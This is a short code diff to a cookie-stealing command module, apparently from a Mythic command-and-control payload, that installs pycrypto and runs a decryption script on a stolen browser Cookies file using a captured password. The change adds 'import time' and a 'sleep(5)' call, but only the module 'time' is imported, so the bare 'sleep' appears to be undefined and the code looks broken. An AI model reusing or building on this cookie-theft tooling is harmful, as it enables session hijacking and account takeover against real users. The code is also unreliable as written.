@@ -5,6 +5,7 @@ from mythic_payloadtype_container.MythicRPC import *
 import traceback
 import subprocess
 import shutil
+import time
 
 class CookieThiefArguments(TaskArguments):
     def __init__(self, command_line):
@@ -148,6 +149,7 @@ class CookieThiefCommand(CommandBase):
         ## Decrypt Cookies file
         try:
             subprocess.run(["pip", "install", "pycrypto"])
+            sleep(5)
             subprocess.run(["python3", "/Mythic/mythic/pycookiecheat/pycookiecheat.py", "--cookies-file tmp_Cookies", "--key " + ccs_password, "--output cookies.json"])
             await MythicRPC().execute("create_output",task_id=task.id,output="Cookies decrypted")
         except Exception as e:
